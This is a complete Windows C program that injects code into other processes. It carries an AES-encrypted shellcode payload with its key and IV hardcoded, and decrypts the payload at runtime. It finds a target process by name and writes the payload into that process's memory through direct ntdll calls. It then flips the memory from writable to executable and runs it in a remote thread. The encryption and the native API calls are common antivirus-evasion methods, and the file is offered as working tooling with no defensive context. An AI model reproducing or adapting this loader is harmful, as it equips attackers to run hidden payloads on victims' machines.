#include <windows.h>
#include <bcrypt.h>
#include <TlHelp32.h>
#include <stdio.h>
#include "ntdll.h"

#pragma comment(lib, "ntdll")
#pragma comment(lib, "Bcrypt.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";


typedef struct _AES {
    PBYTE pPlainText;
    DWORD dwPlainSize;

    PBYTE pCipherText;
    DWORD dwCipherSize;

    PBYTE pKey;
    PBYTE pIv;
}AES, * PAES;

VOID PrintHexData(LPCSTR Name, PBYTE pData, SIZE_T sSize) {
    printf("unsigned char %s[] = {", Name);

    for (int i = 0; i < sSize; i++) {
        if (i % 16 == 0) {
            printf("\n\t");
        }
        if (i < sSize - 1) {
            printf("0x%0.2X, ", pData[i]);
        }
        else {
            printf("0x%0.2X ", pData[i]);
        }
    }
    printf("};\n\n\n");
}

BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId) {

	HANDLE hSnapShot = NULL;
    BOOL bState = TRUE;
	PROCESSENTRY32 Process = { 0 };
	Process.dwSize = sizeof(PROCESSENTRY32);

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32SnapShot failed\n");
        bState = FALSE; goto _CLEANUP;
	}

	if (!Process32First(hSnapShot, &Process)) {
		printf("Process32First failed\n");
		CloseHandle(hSnapShot);
        bState = FALSE; goto _CLEANUP;
	}

	do {

		WCHAR LowerCaseName[MAX_PATH * 2];

		if (Process.szExeFile) {
			DWORD dwSize = lstrlenW(Process.szExeFile);
			DWORD i = 0;

			RtlSecureZeroMemory(LowerCaseName, sizeof(LowerCaseName));

			if (dwSize < MAX_PATH * 2) {
				for (; i < dwSize; i++) {
					LowerCaseName[i] = (WCHAR)tolower(Process.szExeFile[i]);
				}
				LowerCaseName[i++] = '\0';
			}
		}
		if (wcscmp(LowerCaseName, szProcessName) == 0) {
			*dwProcessId = Process.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapShot, &Process));

_CLEANUP:
    if (hSnapShot != NULL) {
        NtClose(hSnapShot);
    }
    if (*dwProcessId == NULL)
        return FALSE;
    return bState;
}

BOOL AesDecryption(PAES pAes) {
    BOOL                  bSTATE = TRUE;
    BCRYPT_ALG_HANDLE     hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE     hKey = NULL;

    ULONG                 cbResult = NULL;
    DWORD                 dwBlockSize = NULL;

    DWORD                 cbKeyObject = NULL;
    PBYTE                 pbKeyObject = NULL;

    PBYTE                 pbPlainText = NULL;
    DWORD                 cbPlainText = NULL;
    NTSTATUS              status = NULL;

    if ((status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0)) != STATUS_SUCCESS) {
        printf("DECRYPTION BCryptOpenAlgorithmProvider failed\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0)) != STATUS_SUCCESS) {
        printf("DECRYPTION first BCryptGetProperty failed\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0)) != STATUS_SUCCESS) {
        printf("DECRYPTION second BCryptGetProperty failed\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if (dwBlockSize != 16) {
        printf("DECRYPTION Block size of InstallAesDecrypt not right\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if (!(pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject))) {
        printf("DECRYPTION key object not populated in InstallAesDecrypt\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0)) != STATUS_SUCCESS) {
        printf("DECYRPTION BCryptSetProperty failed\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, 32, 0)) != STATUS_SUCCESS) {
        printf("DECRYPTION BCryptGenerateSymmetricKey failed\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptDecrypt(hKey, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, 16, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING)) != STATUS_SUCCESS) {
        printf("DECRYPTION first BCryptDecrypt failed 0x%0.8X\n", status);
        bSTATE = FALSE; goto _CLEANUP;
    }

    if (!(pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText))) {
        printf("DECRYPTION pbPlainText is null in InstallAesDecryption\n");
        bSTATE = FALSE; goto _CLEANUP;
    }

    if ((status = BCryptDecrypt(hKey, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, 16, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING)) != STATUS_SUCCESS) {
        printf("DECRYPTION second BCryptDecrypt failed 0x%0.8X \n", status);
        bSTATE = FALSE; goto _CLEANUP;
    }


_CLEANUP:
    if (hKey) {
        BCryptDestroyKey(hKey);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }

    return bSTATE;
}

BOOL SimpleDecryption(PVOID pCipherTextData, DWORD dwCipherTextSize, PBYTE pKey, PBYTE pIv, PVOID* pPlainTextData, DWORD* sPlainTextSize) {

    if (pCipherTextData == NULL || dwCipherTextSize == NULL || pKey == NULL || pIv == NULL) {
        return FALSE;
    }

    AES Aes = { 0 };
    Aes.pKey = pKey;
    Aes.pIv = pIv;
    Aes.pCipherText = (PBYTE)pCipherTextData;
    Aes.dwCipherSize = dwCipherTextSize;

    if (!AesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {

    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    NTSTATUS status = NULL;
    LPVOID rBuffer = NULL;
    DWORD PID = NULL;
    SIZE_T sNumOfBytes = NULL;
    SIZE_T sShellCodeSize = NULL;
    ULONG cbOldProtection = NULL;
    BOOL bState = TRUE;

    OBJECT_ATTRIBUTES OA = { 0 };
    INITIAL_TEB IT = { 0 };
    CLIENT_ID CI = { 0 };

    PVOID shellcode = NULL;

    unsigned char CipherText[] = {
        0x01, 0xD6, 0x0F, 0x15, 0xE2, 0xDA, 0xFA, 0x39, 0x7B, 0xAE, 0x81, 0x9D, 0xF3, 0xD8, 0x08, 0x61,
        0xE8, 0x63, 0x64, 0xE4, 0xDF, 0xF4, 0xD6, 0x4C, 0xAA, 0x95, 0x6F, 0x76, 0xFF, 0x45, 0x13, 0xFB,
        0x6F, 0x67, 0xF3, 0x49, 0x7B, 0x7F, 0x45, 0x6C, 0x66, 0x30, 0x4E, 0xF9, 0xB5, 0x6E, 0xCE, 0x1B,
        0x84, 0x69, 0x0F, 0x5E, 0xBB, 0x8B, 0xE5, 0x69, 0xC1, 0xEC, 0xBA, 0xF7, 0xC4, 0xB0, 0x37, 0x00,
        0x45, 0x91, 0xA8, 0xD7, 0x93, 0x62, 0x0C, 0x57, 0x26, 0x03, 0x0C, 0xE3, 0x8F, 0x40, 0x31, 0xD1 };

    unsigned char pIv[] = {
        0x4A, 0x67, 0x90, 0x84, 0x8A, 0x42, 0x6F, 0xDD, 0xDE, 0x6D, 0xC1, 0xAE, 0x58, 0x7B, 0x5F, 0xBD };

    unsigned char pKey[] = {
        0x4A, 0x67, 0x90, 0x84, 0x8A, 0x42, 0x6F, 0xDD, 0xDE, 0x6D, 0xC1, 0xAE, 0x58, 0x7B, 0x5F, 0xBD,
        0xB2, 0x12, 0xE6, 0x81, 0x9E, 0xF0, 0xAF, 0x3E, 0x57, 0x2C, 0x02, 0x72, 0x7C, 0xBE, 0x86, 0x70 };

    OA.Length = sizeof(OBJECT_ATTRIBUTES);
    OA.Attributes = 0x00000040L;

    if (!SimpleDecryption(CipherText, sizeof(CipherText), pKey, pIv, &shellcode, (DWORD*)&sShellCodeSize)) {
        return EXIT_FAILURE;
    }

    memset(CipherText, '\0', sizeof(CipherText));

    if (argc < 2) {
        printf("%s Too few arguments in terminal\n", e);
        printf("%s Usage: %s <runningprogram.exe>\n", i, argv[0]);
        bState = FALSE; goto _CLEANUP;
    }

    wprintf(L"%s Attempting to inject encrypted payload into \"%s\"\n", i, argv[1]);

    wprintf(L"%s Finding the PID of \"%s\"\n", i, argv[1]);

    if (!GetRemoteProcessHandle(argv[1], &PID)) {
        printf("%s Process not found\n", e);
        bState = FALSE; goto _CLEANUP;
    }

    printf("%s Found target process PID: %d\n", k, PID);

    CI.UniqueProcess = (HANDLE)PID;

    if ((status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CI)) != STATUS_SUCCESS) {
        printf(" %s Failed opening process\n", e);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Got a handle to process: 0x%p\n", k, hProcess);
    
    if ((status = NtAllocateVirtualMemory(hProcess, &rBuffer, NULL, &sShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != STATUS_SUCCESS) {
        printf(" %s Failed to allocate %zu-bytes of memory to process\n", e, sShellCodeSize);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Allocated %zu-bytes of memory to target process starting at 0x%p\n", k, sShellCodeSize, rBuffer);

    if ((status = NtWriteVirtualMemory(hProcess, rBuffer, shellcode, sShellCodeSize, &sNumOfBytes)) != STATUS_SUCCESS) {
        printf(" %s Failed writing %zu-bytes of memory to target process\n", e, sShellCodeSize);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Wrote %zu-bytes of memory to target process starting at 0x%p\n", k, sShellCodeSize, rBuffer);

    memset(shellcode, '\0', sShellCodeSize);

    if ((status = NtProtectVirtualMemory(hProcess, &rBuffer, &sShellCodeSize, PAGE_EXECUTE_READ, &cbOldProtection)) != STATUS_SUCCESS) {
        printf(" %s Failed changing memory protections\n", e);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Changed memory permissions from [RW-] to [R-X]\n", k);

    if ((status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL)) != STATUS_SUCCESS) {
        printf(" %s Failed to create thread in target process\n", e);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Created thread with the ID 0x%p\n", k, hThread);

    printf("%s Waiting for thread to finish execution\n", i);

    if ((status = NtWaitForSingleObject(hThread, FALSE, NULL)) != STATUS_SUCCESS) {
        printf(" %s Failed waiting for thread\n", e);
        printf("ERROR: 0x%lx\n", status);
        bState = FALSE; goto _CLEANUP;
    }
    printf("%s Thread finished executing\n", i);

    printf("%s Cleaning up\n", i);

_CLEANUP:
    if (hThread != NULL) {
        NtClose(hThread);
    }
    if (hProcess != NULL) {
        NtClose(hProcess);
    }
    if (shellcode != NULL) {
        HeapFree(GetProcessHeap(), 0, shellcode);
    }
    system("PAUSE");

    return bState;
}
